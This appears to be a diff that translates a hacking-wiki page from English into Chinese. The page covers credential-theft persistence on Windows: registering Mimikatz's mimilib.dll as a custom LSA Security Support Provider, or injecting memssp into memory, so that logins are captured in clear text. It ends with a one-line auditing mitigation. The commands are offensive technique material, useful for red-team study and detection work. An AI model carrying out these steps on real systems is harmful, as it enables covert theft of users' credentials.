@@ -4,44 +4,37 @@
 
 ### Custom SSP
 
-[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
-You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.
+[了解什么是 SSP (Security Support Provider) 在这里。](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+您可以创建您自己的 **SSP** 来 **捕获** 以 **明文** 形式使用的 **凭据** 以访问机器。
 
 #### Mimilib
 
-You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**\
-Drop the dll in `C:\Windows\System32\`\
-Get a list existing LSA Security Packages:
-
+您可以使用 Mimikatz 提供的 `mimilib.dll` 二进制文件。**这将把所有凭据以明文形式记录在一个文件中。**\
+将 dll 放入 `C:\Windows\System32\`\
+获取现有 LSA 安全包的列表：
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
-    Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
+Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-
-Add `mimilib.dll` to the Security Support Provider list (Security Packages):
-
+将 `mimilib.dll` 添加到安全支持提供程序列表（安全包）：
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
+在重启后，所有凭据可以在 `C:\Windows\System32\kiwissp.log` 中以明文形式找到。
 
-And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`
+#### 在内存中
 
-#### In memory
-
-You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
-
+您还可以直接使用 Mimikatz 在内存中注入此内容（请注意，这可能有点不稳定/无法工作）：
 ```powershell
 privilege::debug
 misc::memssp
 ```
+这不会在重启后存活。
 
-This won't survive reboots.
+#### 缓解措施
 
-#### Mitigation
-
-Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+事件 ID 4657 - 审计创建/更改 `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
 
 {{#include ../../banners/hacktricks-training.md}}
-
